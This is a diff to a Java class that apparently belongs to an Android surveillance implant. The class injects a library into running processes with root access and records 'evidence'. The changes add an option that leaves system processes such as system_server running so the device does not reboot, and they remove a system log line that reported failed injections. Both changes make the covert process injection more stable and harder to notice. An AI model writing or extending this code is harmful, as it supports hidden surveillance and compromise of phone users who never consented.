@@ -44,6 +44,7 @@ public class Instrument implements Runnable{
 	private ArrayList<String> argList = new ArrayList<String>();
 	private int timeout = 180;
 	private int pidInjected;
+	private boolean killToStop = true;
 
 
 	public Instrument(String process, String dump,Semaphore sem,String library,String owner) {
@@ -79,6 +80,21 @@ public class Instrument implements Runnable{
 		if(autoCreate) {
 			createMsgStorage();
 		}
+	}
+
+	public boolean isKillToStop() {
+		return killToStop;
+	}
+
+	/**
+	 * Set whatever the instrumentation shall kill the process to
+	 * stop it.
+	 * In case of system processes, like system_server may be better to not kill the process
+	 * but not responding at the socket is enough to continue with the normal executions.
+	 * @param killToStop
+	 */
+	public void setKillToStop(boolean killToStop) {
+		this.killToStop = killToStop;
 	}
 
 	/**
@@ -264,7 +280,7 @@ public class Instrument implements Runnable{
 							{
 								Check.log(TAG + " "+s);
 							}
-							Check.log(TAG + " (startInstrumentation) "+proc+" exit code: " + ret.exitCode);
+							Check.log(TAG + " (startInstrumentation) " + proc + " exit code: " + ret.exitCode);
 						}
 
 						Root.removeScript(scriptName);
@@ -318,7 +334,9 @@ public class Instrument implements Runnable{
 							if (Cfg.DEBUG) {
 								Check.log(TAG + " (_startInstrumentation) Kill "+proc);
 							}
-							killProc(proc);
+							if(isKillToStop()) {
+								killProc(proc);
+							}
 							killed += 1;
 						}
 					} else {
@@ -359,33 +377,37 @@ public class Instrument implements Runnable{
 		if ( pidMonitor != null ){
 			pidMonitor.setStopMonitor(true);
 		}
-
-		while(trials-->0 && pid_start==pid_stop) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (stopInstrumentation "+proc+") trials: " + trials);
-			}
-
-			try {
-				if(sync_semaphore != null) {
-					sync_semaphore.tryAcquire(Utils.getRandom(10), TimeUnit.SECONDS);
-					try {
-						killProc(proc);
-					} finally {
-							sync_semaphore.release();
-					}
-				}else{
-					killProc(proc);
-				}
-
-			} catch (InterruptedException e) {
+		if(isKillToStop()) {
+			while (trials-- > 0 && pid_start == pid_stop) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (stopInstrumentation "+proc+") Error: " + e);
-					Check.log(TAG + " (stopInstrumentation "+proc+") Interrupted when trying to restore "+ proc);
+					Check.log(TAG + " (stopInstrumentation " + proc + ") trials: " + trials);
 				}
+
+				try {
+					if (sync_semaphore != null) {
+						sync_semaphore.tryAcquire(Utils.getRandom(10), TimeUnit.SECONDS);
+						try {
+							killProc(proc);
+						} finally {
+							sync_semaphore.release();
+						}
+					} else {
+						killProc(proc);
+					}
+
+				} catch (InterruptedException e) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (stopInstrumentation " + proc + ") Error: " + e);
+						Check.log(TAG + " (stopInstrumentation " + proc + ") Interrupted when trying to restore " + proc);
+					}
+				}
+				pid_stop = getProcessPid(proc, proc_owner);
 			}
-			pid_stop = getProcessPid(proc,proc_owner);
-		}
-		if(pid_start != pid_stop){
+			if (pid_start != pid_stop) {
+				started = false;
+			}
+		}else{
+			Check.log(TAG + " (stopInstrumentation " + proc + ") not killing the process because it will cause a reboot");
 			started = false;
 		}
 	}
@@ -625,7 +647,6 @@ public class Instrument implements Runnable{
 			
 				Status.self().makeToast(String.format(M.e("injection %s cannot be installed,too many trials"), proc));
 			}
-			Log.d(TAG,String.format(M.e("injection %s cannot be installed,too many trials"), proc));
 			EvidenceBuilder.info(String.format(M.e("injection %s cannot be installed,too many trials"), proc));
 		}
 		return false;
